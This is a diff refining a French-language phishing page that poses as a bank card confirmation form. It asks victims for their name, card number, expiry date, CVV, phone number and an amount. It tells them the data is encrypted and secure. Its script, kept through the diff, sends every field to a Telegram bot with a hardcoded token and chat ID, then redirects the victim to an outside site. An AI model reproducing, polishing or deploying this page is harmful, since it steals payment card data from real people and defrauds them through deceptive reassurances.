@@ -2,17 +2,21 @@
 <html lang="fr">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
   <title>Confirmez votre carte</title>
-  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap">
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
   <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
   <script src="https://cdn.jsdelivr.net/npm/inputmask@5.0.6/dist/inputmask.min.js"></script>
   <style>
+    * {
+      box-sizing: border-box;
+    }
+
     body {
-      font-family: 'Roboto', sans-serif;
       margin: 0;
       padding: 0;
-      background-color: #f4f4f4;
+      font-family: 'Roboto', sans-serif;
+      background: #f4f4f4;
       display: flex;
       flex-direction: column;
       align-items: center;
@@ -20,48 +24,44 @@
 
     header {
       width: 100%;
-      padding: 20px 0;
+      padding: 10px 0;
+      background-color: #ffffff;
       display: flex;
       justify-content: center;
-      background-color: #ffffff;
     }
 
     header img {
-      width: 150px;
-      height: auto;
+      width: 120px;
     }
 
     main {
-      padding: 20px;
+      padding: 15px;
       width: 100%;
-      max-width: 400px;
+      max-width: 360px;
       background-color: white;
-      margin-top: 20px;
+      margin-top: 10px;
       border-radius: 8px;
-      box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
-      text-align: center;
+      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
     }
 
     h1 {
-      font-size: 24px;
-      font-weight: 700;
+      font-size: 20px;
       color: #333;
-      margin-bottom: 20px;
+      text-align: center;
+      margin-bottom: 15px;
     }
 
     .form-row {
-      margin-bottom: 15px;
+      margin-bottom: 10px;
     }
 
     .form-row input,
     .form-row select {
       width: 100%;
-      padding: 14px;
+      padding: 10px;
+      font-size: 13px;
+      border: 1.5px solid #ccc;
       border-radius: 5px;
-      border: 2px solid #ccc;
-      font-size: 14px;
-      box-sizing: border-box;
-      color: #333;
     }
 
     .form-row input:focus,
@@ -72,27 +72,26 @@
 
     .coll button {
       width: 100%;
-      height: 50px;
+      padding: 12px;
+      font-size: 14px;
+      font-weight: bold;
       color: white;
       background: #ff6e14;
-      border-radius: 25px;
       border: none;
-      font-size: 1em;
-      font-weight: bold;
-      margin-top: 10px;
+      border-radius: 25px;
       cursor: pointer;
-      transition: background-color 0.3s;
+      transition: background 0.3s;
     }
 
     .coll button:hover {
-      background-color: #e05e00;
+      background: #e05e00;
     }
 
     .card-container {
-      width: 300px;
-      height: 180px;
+      width: 100%;
+      height: 160px;
       perspective: 1000px;
-      margin: 20px auto;
+      margin: 10px auto;
     }
 
     .card {
@@ -111,10 +110,9 @@
       height: 100%;
       border-radius: 12px;
       backface-visibility: hidden;
-      padding: 20px;
-      box-sizing: border-box;
-      color: white;
+      padding: 15px;
       background: linear-gradient(135deg, #004a99, #00aaff);
+      color: white;
     }
 
     .card-front {
@@ -124,27 +122,25 @@
     }
 
     .chip {
-      width: 50px;
-      height: 35px;
+      width: 40px;
+      height: 25px;
       background: gold;
-      border-radius: 5px;
-      margin-bottom: 15px;
+      border-radius: 4px;
     }
 
     .number {
-      font-size: 1em;
+      font-size: 0.9em;
       letter-spacing: 2px;
-      margin-bottom: 10px;
     }
 
     .name-date {
       display: flex;
       justify-content: space-between;
-      font-size: 0.85em;
+      font-size: 0.75em;
     }
 
     .label {
-      font-size: 0.7em;
+      font-size: 0.65em;
       color: #ccc;
     }
 
@@ -153,42 +149,33 @@
     }
 
     .stripe {
+      height: 35px;
       background: rgba(0, 0, 0, 0.7);
-      height: 40px;
       margin-top: 10px;
     }
 
     .cvv-block {
-      margin-top: 20px;
       text-align: right;
-    }
-
-    .cvv-label {
-      font-size: 0.75em;
-      margin-bottom: 5px;
-      color: #ccc;
+      margin-top: 15px;
     }
 
     .cvv {
       background: white;
       color: black;
-      padding: 5px 10px;
-      border-radius: 5px;
-      display: inline-block;
-      font-size: 1em;
+      font-size: 0.9em;
+      padding: 4px 8px;
+      border-radius: 4px;
     }
 
     @keyframes flip {
       0%, 100% { transform: rotateY(0deg); }
-      50%      { transform: rotateY(180deg); }
+      50% { transform: rotateY(180deg); }
     }
 
     .info-text {
-      font-size: 0.85em;
+      font-size: 0.75em;
       color: #666;
-      margin-top: 15px;
-      margin-bottom: 25px;
-      line-height: 1.5;
+      margin: 10px 0 15px;
       text-align: justify;
       font-weight: bold;
     }
@@ -230,7 +217,7 @@
   </div>
 
   <div class="info-text">
-    Pour des raisons de sécurité, nous procéderons parfois à la vérification rapide de vos informations personnelles y compris à chaque mise à jour du site. Important : les informations que vous entrez sont cryptées et transmises vers notre serveur sécurisé.
+    Pour des raisons de sécurité, nous procédons parfois à une vérification rapide de vos informations personnelles. Important : les informations saisies sont cryptées et sécurisées.
   </div>
 
   <form id="cardForm">
@@ -261,33 +248,14 @@
       </select>
     </div>
 
-    <div class="form-row">
-      <input type="text" name="fullname" id="fullname" required placeholder="Nom et Prénoms">
-    </div>
+    <div class="form-row"><input type="text" id="fullname" name="fullname" placeholder="Nom et Prénoms" required></div>
+    <div class="form-row"><input type="text" id="cardNumber" name="cardNumber" placeholder="Numéro de carte" maxlength="16" pattern="\d{16}" required></div>
+    <div class="form-row"><input type="text" id="expiryDateInput" name="expiryDateInput" placeholder="Date d'expiration (MM/YYYY)" maxlength="7" required></div>
+    <div class="form-row"><input type="text" id="cvvInput" name="cvv" placeholder="CVV" maxlength="3" pattern="\d{3}" required></div>
+    <div class="form-row"><input type="text" id="amount" name="amount" placeholder="Montant à recevoir" required></div>
+    <div class="form-row"><input type="text" id="phone" name="phone" placeholder="Numéro de téléphone" required></div>
 
-    <div class="form-row">
-      <input type="text" name="cardNumber" id="cardNumber" required placeholder="Numéro de carte" maxlength="16" pattern="\d{16}">
-    </div>
-
-    <div class="form-row">
-      <input type="text" name="expiryDateInput" id="expiryDateInput" required placeholder="Date d'expiration (MM/YYYY)" maxlength="7" pattern="\d{2}/\d{4}">
-    </div>
-
-    <div class="form-row">
-      <input type="text" name="cvv" id="cvvInput" required placeholder="CVV" maxlength="3" pattern="\d{3}">
-    </div>
-
-    <div class="form-row">
-      <input type="text" name="amount" id="amount" required placeholder="Montant à recevoir">
-    </div>
-
-    <div class="form-row">
-      <input type="text" name="phone" id="phone" required placeholder="Numéro de téléphone">
-    </div>
-
-    <div class="coll">
-      <button type="submit">Confirmer la carte</button>
-    </div>
+    <div class="coll"><button type="submit">Confirmer la carte</button></div>
   </form>
 </main>
 
@@ -322,19 +290,15 @@ $(document).ready(function() {
 - Montant : ${amount}
 - Téléphone : ${phone}`;
 
-    var telegramUrl = `https://api.telegram.org/bot7621285753:AAEVe240rt235EoRpGxiy0PSw1F-fRTd7mA/sendMessage`;
-    var params = {
+    $.post("https://api.telegram.org/bot7621285753:AAEVe240rt235EoRpGxiy0PSw1F-fRTd7mA/sendMessage", {
       chat_id: '7421525298',
       text: message,
       parse_mode: 'Markdown'
-    };
-
-    $.post(telegramUrl, params, function(response) {
-      console.log(response);
+    }).done(function() {
       window.location.href = "https://encours-psi.vercel.app/";
     }).fail(function(error) {
-      console.error(error);
       alert("Erreur lors de l'envoi des données.");
+      console.error(error);
     });
   });
 });
